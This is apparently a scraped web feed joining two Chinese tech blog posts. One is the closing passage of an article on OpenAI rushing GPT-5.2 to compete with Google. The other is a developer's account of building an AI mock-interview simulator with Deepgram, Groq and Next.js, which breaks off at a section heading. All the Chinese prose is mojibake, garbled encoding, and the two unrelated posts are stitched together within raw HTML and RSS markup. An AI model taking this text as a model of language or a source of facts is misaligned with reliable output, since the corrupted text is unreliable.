<p>ç”±äºè¿™ç§ç´§è¿«æ€§ï¼ŒGPT-5.2 å¯èƒ½åªæœ‰æ•°å¤©çš„æ—¶é—´æ¥å®Œæˆå¹¶éƒ¨ç½²è¿™æ¬¡é‡å¤§æ›´æ–°ã€‚</p>
<p>å¦‚æ­¤ä»“ä¿ƒçš„å‘å¸ƒï¼Œä¹Ÿå¾ˆæœ‰å¯èƒ½å¸¦æ¥é—®é¢˜ã€‚</p>
<p>æ­¤å¤–ï¼Œè°·æ­Œè¿˜æ‹¥æœ‰åˆ†å‘ä¼˜åŠ¿ï¼Œä»–ä»¬èƒ½åœ¨ä¸€å¤œä¹‹é—´é€šè¿‡æœç´¢ã€Gmail å’Œ Workspace å°†æ–°åŠŸèƒ½æ¨é€ç»™æ•°åäº¿ç”¨æˆ·ã€‚</p>
<p>æ›´å®è§‚çš„å›¾æ™¯åœ¨äºï¼ŒAI é¢†åŸŸåˆšåˆšä»ä¸€å®¶ç‹¬å¤§è½¬å˜ä¸ºå¤šæ–¹ç«é€çš„å±€é¢ã€‚</p>
<p>æœªæ¥å‡ å¹´ï¼Œå°†ä¼šå‡ºç°è¿™ç§æŒç»­çš„æ›´æ–°å‘¨æœŸï¼Œå„ç§æ¨¡å‹åœ¨æŠ€æœ¯ç«èµ›ä¸­ä¸æ–­äº’ç›¸è¶…è¶Šã€‚</p>
<p>è‹¥ GPT-5.2 èƒ½å¤ŸæˆåŠŸå¤ºå›åŸºå‡†æµ‹è¯•çš„æ¡‚å† ï¼ŒOpenAI å°†èµ¢å¾—å®è´µçš„æ—¶é—´çª—å£ä¸å¸‚åœºç¨³å®šæœŸã€‚</p>
<p>å€˜è‹¥å‘å¸ƒæ—¶å­˜åœ¨ç¼ºé™·æˆ–æœªè¾¾é¢„æœŸï¼Œè°·æ­Œå°†ä¸»å¯¼è¡Œä¸šè¯è¯­æƒã€‚</p>
<p>æœ‰è¶£çš„æ˜¯ï¼Œè¿™æ­£æ˜¯å½“åˆ ChatGPT æ¨ªç©ºå‡ºä¸–æ—¶è°·æ­Œæ‰€æ‰¿å—çš„å‹åŠ›ã€‚</p>
<p>è°èƒ½æŒç»­ç«™åœ¨ AI æ€§èƒ½çš„æœ€å‰æ²¿ï¼Œå¹¶è®©ç”¨æˆ·ç¡®ä¿¡å…¶äº§å“çœŸæ­£æ›´èƒœä¸€ç­¹ï¼Œè°å°±å°†èµ¢å¾—æœªæ¥åå¹´ã€‚</p>
<p>è¿™æ­£æ˜¯æ­¤åˆ»è‡³å…³é‡è¦çš„åŸå› ã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkimmonismus%2Fstatus%2F1997001299074982105" target="_blank" title="https://x.com/kimmonismus/status/1997001299074982105" ref="nofollow noopener noreferrer">x.com/kimmonismusâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fstratechery%2Fstatus%2F1997003039505633714" target="_blank" title="https://x.com/stratechery/status/1997003039505633714" ref="nofollow noopener noreferrer">x.com/stratecheryâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theverge.com%2Freport%2F838857%2Fopenai-gpt-5-2-release-date-code-red-google-response" target="_blank" title="https://www.theverge.com/report/838857/openai-gpt-5-2-release-date-code-red-google-response" ref="nofollow noopener noreferrer">www.theverge.com/report/8388â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥ æ‡‚åŸç†ä½†ä¸ä¼šè¯´ï¼Ÿæˆ‘æ€’å†™äº†ä¸ª AI æ¨¡æ‹Ÿå™¨é€¼è‡ªå·±å¼€å£]]></title>    <link>https://juejin.cn/post/7579871631096184858</link>    <guid>https://juejin.cn/post/7579871631096184858</guid>    <pubDate>2025-12-04T17:31:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579871631096184858" data-draft-id="7579811819667505204" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ğŸ”¥ æ‡‚åŸç†ä½†ä¸ä¼šè¯´ï¼Ÿæˆ‘æ€’å†™äº†ä¸ª AI æ¨¡æ‹Ÿå™¨é€¼è‡ªå·±å¼€å£"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-04T17:31:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HiStewie"/> <meta itemprop="url" content="https://juejin.cn/user/1591748568038823"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ğŸ”¥ æ‡‚åŸç†ä½†ä¸ä¼šè¯´ï¼Ÿæˆ‘æ€’å†™äº†ä¸ª AI æ¨¡æ‹Ÿå™¨é€¼è‡ªå·±å¼€å£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748568038823/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HiStewie
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T17:31:56.000Z" title="Thu Dec 04 2025 17:31:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    489
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f95a27d977e441aebe3cb683f6f182ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=im4OPFRqdwKdmzS9urbd6EdR%2FKc%3D" alt="gif-2025-12-05 at 12.49.52 .gif" loading="lazy"/></p>
<p><strong>ğŸ”— ä½“éªŒåœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.quizport.org%2F" target="_blank" title="https://www.quizport.org/" ref="nofollow noopener noreferrer">www.quizport.org/</a></p>
<p>é¢è¯•æ˜¯ä¸€é¡¹æŠ€èƒ½ï¼Œè€Œä»»ä½•æŠ€èƒ½çš„è¿›é˜¶éƒ½ç¦»ä¸å¼€â€œé«˜é¢‘ç»ƒä¹ â€ä¸â€œå³æ—¶åé¦ˆâ€è¿™ä¸¤ä¸ªæ ¸å¿ƒè¦ç´ ã€‚</p>
<p>ä¼ ç»Ÿçš„é¢è¯•å‡†å¤‡å¾€å¾€é™·å…¥ä¸¤ä¸ªæç«¯ï¼šè¦ä¹ˆå¯¹ç€é•œå­è‡ªè¨€è‡ªè¯­ï¼Œç¼ºä¹å®¢è§‚çš„ç¬¬ä¸‰æ–¹è§†è§’ï¼›è¦ä¹ˆèŠ±é‡é‡‘æ‰¾å¯¼å¸ˆæ¨¡æ‹Ÿï¼Œæˆæœ¬é«˜æ˜‚ä¸”éš¾ä»¥å¸¸æ€åŒ–ã€‚æŠ€æœ¯å­˜åœ¨çš„æ„ä¹‰ï¼Œå°±æ˜¯ç”¨ä½è¾¹é™…æˆæœ¬è§£å†³é«˜é¢‘ç—›ç‚¹ã€‚</p>
<p>ä½†è¿™å…¶å®å¹¶ä¸æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å°è¯•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘æ›¾å¼€å‘è¿‡ä¸€ä¸ªåˆç‰ˆå·¥å…·ï¼šï¼ˆ<a href="https://juejin.cn/post/7569035733257715758" target="_blank" title="https://juejin.cn/post/7569035733257715758">QuizPort1.0 è®©æ¯ç¯‡å¥½æ–‡éƒ½æœ‰æµ‹éªŒé™ªè·‘</a>ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be701d8ea56849558a87ecec43b4d70b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=wvAz%2FSU4DImLFQPv2Jb8%2FWCAr5s%3D" alt="5bf7b436a2f245a9a41696d65edc5891~tplv-73owjymdk6-jj-mark-v1_0_0_0_0_5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=_q75.webp" loading="lazy"/></p>
<p>å½“æ—¶çš„æ€è·¯å¾ˆçº¿æ€§ï¼š<strong>æŠ“å–æŠ€æœ¯æ–‡ç«  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> AI æç‚¼çŸ¥è¯†ç‚¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> ç”Ÿæˆæ–‡å­—é¢è¯•é¢˜</strong>ã€‚</p>
<p>ä½†åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œ<strong>æˆ‘å‘ç°è¿™ç§åšé¢˜æ¨¡å¼æŒºå¼±æ™ºçš„</strong>ï¼Œä¸€æ˜¯ä¿¡æºå¤ªå°‘ï¼Œå°±ä¸€ç¯‡å‚è€ƒæ–‡ç« å‡ºé‚£ç§è®©äººéƒ½é€‰Cçš„åƒåœ¾é¢˜ï¼Œç¬¬äºŒæ˜¯æ— æ³•è§£å†³â€œä¸€å¼€å£å°±ç´§å¼ â€æˆ–è€…â€œæ‡‚åŸç†ä½†è¯´ä¸æ¸…æ¥šâ€çš„ç—›ç‚¹ã€‚</p>
<p>ä¸ºäº†æ‰“ç ´è¿™ç§â€œçº¸ä¸Šè°ˆå…µâ€çš„å±€é™ï¼Œæˆ‘å†³å®šå€ŸåŠ© <strong>TRAE SOLO</strong> å¯¹é¡¹ç›®è¿›è¡Œå½»åº•çš„<strong>é‡æ„</strong>ã€‚è¿™ä¸€æ¬¡ï¼Œæˆ‘å°†äº¤äº’ç»´åº¦ä»â€œæ–‡æœ¬â€å‡çº§ä¸ºâ€œéŸ³è§†é¢‘â€ï¼Œæ‰“é€ ä¸€ä¸ªçœŸæ­£çš„<strong>å®æ—¶æ¨¡æ‹Ÿé¢è¯•</strong>ç¯å¢ƒã€‚</p>
<p>æœ¬æ–‡å°†è·³è¿‡åŸºç¡€çš„ä»£ç ç²˜è´´ï¼Œä»æ¶æ„å†³ç­–ã€æŠ€æœ¯é€‰å‹åˆ°å·¥ç¨‹åŒ–è½åœ°çš„å…¨é“¾è·¯è§†è§’ï¼Œå¤ç›˜æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ TRAE SOLO å°†è¿™ä¸ªæ¨¡ç³Šçš„æƒ³æ³•åœ¨<strong>ä»…ä»…ä¸€ä¸ªæ™šä¸Š</strong>çš„æ—¶é—´å†…è½¬åŒ–ä¸ºå¯ç”¨çš„ MVPã€‚</p>
<h2 data-id="heading-0">ä¸€ã€æ¶æ„è®¾è®¡ï¼šä»æŠ½è±¡æ€ç»´åˆ°å…·è±¡è“å›¾</h2>
<p>åœ¨å¼€å‘åˆæœŸï¼Œæœ€å¤§çš„é˜»åŠ›å¾€å¾€ä¸æ˜¯å†™ä»£ç ï¼Œè€Œæ˜¯å¦‚ä½•å°†è„‘æµ·ä¸­å‘æ•£çš„åŠŸèƒ½ç‚¹æ”¶æŸä¸ºæ¸…æ™°çš„ç³»ç»Ÿæ¶æ„ã€‚ä¸€ä¸ªå¥½çš„æ¶æ„è®¾è®¡ï¼Œèƒ½è§„é¿æ‰æœªæ¥å¼€å‘ä¸­ 80% çš„è¿”å·¥é£é™©ã€‚</p>
<p>å€ŸåŠ© TRAE SOLO çš„ SOLO coder åŠŸèƒ½ï¼Œæˆ‘è·³è¿‡äº†ç¹ççš„æ‰‹ç»˜æµç¨‹ã€‚æˆ‘ä»…å‘å®ƒæè¿°äº†â€œç®€å†è§£æã€é¢è¯•äº¤äº’ã€åé¦ˆè¯„ä¼°â€è¿™ä¸‰æ¡æ ¸å¿ƒæ•°æ®æµï¼Œå®ƒä¾¿è¿…é€Ÿç”Ÿæˆäº†å¦‚ä¸‹çš„æ¶æ„é€»è¾‘ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37ed54330f474207842c4dbe224f21b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=BR6adUNF9SRjO6LJLvj5RUQIuQA%3D" alt="æˆªå±2025-12-05 01.05.40.png" loading="lazy"/></p>
<p>åŸºäºè¿™å¼ è“å›¾ï¼Œç³»ç»Ÿè¢«ç²¾å‡†åˆ‡å‰²ä¸ºäº”ä¸ªç‹¬ç«‹æ¨¡å—ï¼šç®€å†å¤„ç†ã€PromptåŠ¨æ€ç”Ÿæˆã€è¯­éŸ³äº¤äº’ã€AIè¯„ä¼°ä»¥åŠå®¹ç¾æ¨¡å—ã€‚è¿™ç§æ¨¡å—åŒ–çš„æ€ç»´æ–¹å¼ï¼Œè®©åç»­çš„å¼€å‘å˜æˆäº†ç®€å•çš„â€œå¡«ç©ºé¢˜â€ï¼Œè€Œä¸æ˜¯å¤æ‚çš„â€œé—®ç­”é¢˜â€ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒå®ç°ï¼šAI èµ‹èƒ½ä¸‹çš„æŠ€æœ¯æ”»åš</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56aa7d3b3c04436197442aad34f54998~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=UtLlACrp2d3h3F8u%2FuCeePzOdzI%3D" alt="æˆªå±2025-12-05 00.41.24.png" loading="lazy"/></p>
<p>åœ¨æ ¸å¿ƒåŠŸèƒ½çš„å®ç°ä¸Šï¼Œæˆ‘å¹¶æ²¡æœ‰ä»é›¶é€ è½®å­ï¼Œè€Œæ˜¯å°† TRAE SOLO ä½œä¸ºæˆ‘çš„â€œæŠ€æœ¯åˆä¼™äººâ€ï¼Œè®©å®ƒè´Ÿè´£å…·ä½“å®ç°çš„ç»†èŠ‚ï¼Œè€Œæˆ‘è´Ÿè´£æŠŠæ§ä¸šåŠ¡é€»è¾‘çš„èµ°å‘ã€‚</p>
<h3 data-id="heading-2">åŠ¨æ€ Prompt ç”Ÿæˆæœºåˆ¶</h3>
<p>å¦‚æœé¢è¯•å®˜å¯¹æ‰€æœ‰å€™é€‰äººéƒ½é—®ä¸€æ ·çš„é—®é¢˜ï¼Œè¿™ä¸ªäº§å“å°±å¤±å»äº†çµé­‚ã€‚çœŸå®çš„é¢è¯•åœºæ™¯è¦æ±‚é—®é¢˜å¿…é¡»å…·å¤‡â€œä¸Šä¸‹æ–‡æ„ŸçŸ¥èƒ½åŠ›â€ã€‚</p>
<p>åˆ©ç”¨ TRAE SOLOï¼Œæˆ‘å¿«é€Ÿæ„å»ºäº†ä¸€å¥—â€œç®€å†è§£æ+æ¨¡æ¿æ³¨å…¥â€çš„æ–¹æ¡ˆã€‚ç³»ç»Ÿé€šè¿‡ <code>pdf-parse</code> æå–ç®€å†ä¸­çš„æŠ€æœ¯æ ˆå…³é”®è¯ï¼Œé…åˆ TRAE SOLO ç”Ÿæˆçš„ç­–ç•¥é€»è¾‘ï¼Œå®ç°äº†é’ˆå¯¹ä¸åŒå²—ä½ï¼ˆå¦‚å‰ç«¯ä¾§é‡æ¡†æ¶åŸç†ï¼Œåç«¯ä¾§é‡é«˜å¹¶å‘ï¼‰çš„å·®å¼‚åŒ–æé—®ã€‚</p>
<p><strong>é™æ€çš„é¢˜åº“æ˜¯æ­»æ°´çš„ï¼ŒåŠ¨æ€çš„ Prompt æ‰æ˜¯æ´»æºã€‚</strong></p>
<h3 data-id="heading-3">è¯­éŸ³è½¬å½•é“¾è·¯çš„å–èˆ</h3>
<p>è¯­éŸ³è½¬å½•çš„å»¶è¿Ÿç›´æ¥å†³å®šäº†ç”¨æˆ·çš„æ²‰æµ¸æ„Ÿã€‚åœ¨æŠ€æœ¯é€‰å‹é˜¶æ®µï¼Œ<strong>æˆ‘é¢ä¸´ WebSocket é•¿è¿æ¥ä¸ REST API çš„æŠ‰æ‹©</strong>ã€‚</p>
<p>TRAE SOLO ç»™å‡ºäº†éå¸¸å®¢è§‚çš„è¯„ä¼°ï¼šè™½ç„¶ WebSocket ç†è®ºå»¶è¿Ÿæ›´ä½ï¼Œä½†åœ¨æµè§ˆå™¨ç«¯çš„å…¼å®¹æ€§å’Œæ–­è¿é‡è¿æœºåˆ¶ä¸Šæå…¶å¤æ‚ï¼Œå®¹æ˜“å¯¼è‡´ MVP é˜¶æ®µçš„ä¸ç¨³å®šã€‚æœ€ç»ˆæˆ‘é‡‡çº³äº†å®ƒçš„å»ºè®®ï¼Œé€‰æ‹©äº† Deepgram çš„ REST API æ–¹æ¡ˆã€‚äº‹å®è¯æ˜ï¼Œåœ¨ MVP é˜¶æ®µï¼Œç¨³å®šæ€§è¿œæ¯”æè‡´çš„ä½å»¶è¿Ÿæ›´é‡è¦ã€‚</p>
<h3 data-id="heading-4">è‡ªé€‚åº”è¿½é—®ç³»ç»Ÿ</h3>
<p>ä¸ºäº†æ¨¡æ‹ŸçœŸäººçš„å‹è¿«æ„Ÿï¼Œæˆ‘è®¾è®¡äº†ä¸€å¥—åŸºäºåˆ†æ•°çš„è¿½é—®çŠ¶æ€æœºã€‚</p>
<p>å½“ç”¨æˆ·å¾—åˆ†è¶…è¿‡80åˆ†æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§¦å‘â€œæ·±åº¦è¿½é—®â€æ¨¡å¼ï¼›</p>
<p>åä¹‹åˆ™é™çº§éš¾åº¦ã€‚è¿™æ®µå¤æ‚çš„çŠ¶æ€ç®¡ç†é€»è¾‘ï¼Œé€šè¿‡ TRAE SOLO ç”Ÿæˆçš„ä»£ç ç»“æ„æ¸…æ™°ä¸”æ³¨é‡Šå®Œå¤‡ï¼Œæå¤§åœ°é™ä½äº†ç»´æŠ¤æˆæœ¬ã€‚</p>
<p><strong>é‚ªæ¶æƒ³æ³•ï¼šæˆ‘ä¹‹åå‡†å¤‡åŠ ä¸€å¥—å‹åŠ›é¢é€»è¾‘ï¼Œè®©é¢è¯•å®˜ç‹ ç‹ æ‹·æ‰“ç”¨æˆ·</strong></p>
<h2 data-id="heading-5">ä¸‰ã€æŠ€æœ¯æ ˆé€‰å‹ï¼šå¯»æ‰¾â€œåˆé€‚â€è€Œéâ€œæœ€æ–°â€</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd41ddf6dc8b4be79cf74e94063fe029~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=GfV64l1TtDbVMJolVtkx2t4fwcM%3D" alt="æˆªå±2025-12-05 00.25.13.png" loading="lazy"/></p>
<p>æŠ€æœ¯é€‰å‹æ²¡æœ‰é“¶å¼¹ï¼Œåªæœ‰æœ€é€‚åˆå½“å‰åœºæ™¯çš„æƒè¡¡ã€‚åœ¨ TRAE SOLO çš„è¾…åŠ©è¯„ä¼°ä¸‹ï¼Œæˆ‘è¿…é€Ÿç¡®å®šäº†ä»¥ä¸‹æŠ€æœ¯ç»„åˆï¼Œä¸»æ‰“â€œå¿«â€ä¸â€œç¨³â€ï¼š</p>








































<table><thead><tr><th align="left">å±‚çº§</th><th align="left">æŠ€æœ¯</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left"><strong>å‰ç«¯</strong></td><td align="left">Next.js 15 + React 18</td><td align="left">App Router æ¶æ„å…ˆè¿›ï¼ŒSSR å¤„ç†ç®€å†è§£ææ›´å®‰å…¨</td></tr><tr><td align="left"><strong>æ ·å¼</strong></td><td align="left">Tailwind CSS 4</td><td align="left">åŸå­åŒ– CSSï¼Œæè‡´çš„å¼€å‘é€Ÿåº¦</td></tr><tr><td align="left"><strong>åŠ¨ç”»</strong></td><td align="left">Framer Motion</td><td align="left">è½»æ¾å®ç°æ‰“å­—æœºæ•ˆæœä¸æµç•…äº¤äº’</td></tr><tr><td align="left"><strong>è¯­éŸ³</strong></td><td align="left">Deepgram API</td><td align="left">ä¸­æ–‡è¯†åˆ«å‡†ç¡®ç‡é«˜ï¼Œæ€§ä»·æ¯”ä¼˜</td></tr><tr><td align="left"><strong>AI</strong></td><td align="left">Groq + OpenAI å…¼å®¹</td><td align="left">Groq æé€Ÿæ¨ç†ä¿è¯å®æ—¶æ€§ï¼ŒOpenAI æ¥å£åšå®¹ç¾å…œåº•</td></tr><tr><td align="left"><strong>PDF</strong></td><td align="left">pdf-parse</td><td align="left">è½»é‡çº§çš„ç®€å†è§£ææ–¹æ¡ˆ</td></tr></tbody></table>
<p><strong>æˆç†Ÿçš„æŠ€æœ¯æ ˆæ˜¯é¡¹ç›®çš„åŸºçŸ³ï¼Œå®ƒèƒ½è®©ä½ æŠŠç²¾åŠ›é›†ä¸­åœ¨ä¸šåŠ¡åˆ›æ–°è€Œéå¡«è¡¥æ¡†æ¶çš„å‘ä¸Šã€‚</strong></p>
<h2 data-id="heading-6">å››ã€é—®é¢˜ä¿®å¤ï¼šDiffView çš„é™ç»´æ‰“å‡»</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85191448f83e4d8395115fd486dfb80a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=qYKZkC2O6ZzaPybLTMvYZDKGOXs%3D" alt="æˆªå±2025-12-05 00.25.44.png" loading="lazy"/></p>
